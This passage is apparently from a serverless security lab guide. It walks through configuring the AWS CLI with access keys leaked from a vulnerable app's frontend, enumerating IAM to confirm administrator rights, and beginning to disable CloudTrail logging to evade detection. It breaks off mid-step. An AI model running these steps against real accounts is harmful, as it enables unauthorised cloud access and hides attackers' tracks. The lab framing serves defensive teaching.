
`aws configure --profile target-account`

This will prompt you for the AWS credentials, default region, and default output format:

```
AWS Access Key ID [None]: [Specify AWS Access Key ID]
AWS Secret Access Key [None]: [Specify AWS Secret Access Key]
Default region name [None]: [Press Enter]
Default output format [None]: [Press Enter]
```

Specify the AWS access key ID and AWS secret access key copied earlier from the frontend code of the vulnerable application. Specify `None` for the default region name. Specify `None` for the default output format.

### 5. List all AWS CLI profiles configured in your environment:

```
aws configure list-profiles
```

This returns the configured profile `target-account`.

### 6. Verify that the AWS CLI is using the correct credentials:

```
aws sts get-caller-identity --profile target-account
```

The following JSON response indicates that the CLI is successfully using the access keys associated with `super-admin-user`:

```
{
    "UserId": "*********************",
    "Account": "************",
    "Arn": "arn:aws:iam::************:user/super-admin-user"
}
```

### 7. Retrieve your AWS account ID and store it in a shell variable:

```
AWS_ACCOUNT_ID=$(aws sts get-caller-identity \
    --profile target-account --query Account --output text)

echo $AWS_ACCOUNT_ID
```

This returns the AWS account ID of the Serverless Lab account.

### 8. Alternatively, you can run the following command to confirm which IAM user is currently authenticated:

```
aws iam get-user --profile target-account
```

This gives you the following output response:

```
{
    "User": {
        "Path": "/",
        "UserName": "super-admin-user",
        "UserId": "*****************",
        "Arn": "arn:aws:iam::*****************:user/super-admin-user",
        "CreateDate": "2025-00-00T00:00:00+00:00"
    }
}
```

### 9. Enumerate the IAM groups associated with your authenticated user:

```
IAM_USER=$(aws iam get-user \
    --profile target-account \
    | jq -r ".User.UserName")

aws iam list-groups-for-user \
    --user-name $IAM_USER \
    --profile target-account
```

You should get the following response, confirming that the user does not belong to any IAM group:

```
{
    "Groups": []
}
```

### 10. Check whether any inline policies are attached directly to your IAM user:

```
aws iam list-user-policies \
    --user-name $IAM_USER \
    --profile target-account
```

This returns the following response:

```
{
    "PolicyNames": []
}
```

This indicates that your IAM user has no inline policies directly attached.

### 11. Check which managed policies are attached to your IAM user:

```
aws iam list-attached-user-policies \
    --user-name $IAM_USER \
    --profile target-account
```

You should get the following JSON response:

```
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

### 12. Let’s retrieve some metadata about the specified managed policy:

```
POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"
aws iam get-policy --policy-arn $POLICY_ARN --profile target-account
```

This returns the following response:

```
{
    "Policy": {
        "PolicyName": "AdministratorAccess",
        "PolicyId": "...",
        "Arn": "arn:aws:iam::aws:policy/AdministratorAccess",
         ...
        "Description": "Provides full access to AWS services and resources.",
        "CreateDate": "2015-00-00T00:00:00+00:00",
        "UpdateDate": "2015-00-00T00:00:00+00:00",
        "Tags": []
    }
}
```

### 13. Retrieve the default version ID of the managed policy:

```
aws iam get-policy --policy-arn $POLICY_ARN \
    --profile target-account \
    | jq ".Policy.DefaultVersionId"
```

This returns `"v1"`.

### 14. Retrieve the JSON policy document for the selected version:

```
aws iam get-policy-version \
    --policy-arn $POLICY_ARN \
    --version-id v1 \
    --profile target-account
```

The following response should validate our assumption that the attached policy allows all actions on all resources in the AWS account:

```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "*",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2015-00-00T00:00:00+00:00"
    }
}
```

###### Tip

You can also run `aws iam get-account-authorization-details --profile target-account` to enumerate the complete IAM authorization configuration.

At this point, you should be aware that with the `AdministratorAccess` policy attached to the `super-admin-user` IAM user, you can perform any action on any resource using the profile configured with the AWS CLI.

From a defensive security standpoint, you must treat any exposed credentials as immediately compromised, remove them from client-side code, rotate them, and refactor the architecture to move any logic that requires credentials to a secure serverless backend, so the frontend never handles sensitive secrets directly.

# Disabling CloudTrail Logging to Evade Detection

Given that CloudTrail logs are used by security teams to monitor activity, detect threats, and investigate incidents, attackers may try to disable logging to cover their tracks and make it harder to determine the scope of a breach. With credentials of an IAM user with the `AdministratorAccess` policy attached, you’ll realize how easy it is for active CloudTrail trails to be turned off by an attacker with just a few commands.

Just as an intruder might disable security cameras in a building to avoid being seen, an attacker with excessive privileges can stop CloudTrail from recording activity. This makes it much harder for defenders to see the actions that were taken, just as a turned-off camera leaves a room unmonitored.

###### Note

This section assumes you are using the Attacker account for simulating an attacker’s attempts to exploit the resources in the serverless lab environment.

With this in mind, let’s see how an attacker could disable CloudTrail logging:

### 1. Continuing where we left off in the previous section, run the following to list all CloudTrail trails configured in the `us-east-1` region:

```
aws cloudtrail list-trails --region us-east-1 --profile target-account
```

This returns the following JSON output:

```
{
    "Trails": [
        {
            "TrailARN": "arn:aws:cloudtrail:us-east-1:.../all-events",
            "Name": "all-events",
            "HomeRegion": "us-east-1"
        },
        {
            "TrailARN": "arn:aws:cloudtrail:us-east-1:.../all-events-02",
            "Name": "all-events",
            "HomeRegion": "us-east-1"
        }
    ]
}
```

### 2. Using the name of the trail retrieved from the previous step, retrieve the name of the S3 bucket where the logs are stored:

```
aws cloudtrail get-trail \
    --name all-events \
    --region us-east-1 \
    --profile target-account
```

This outputs the following JSON response:
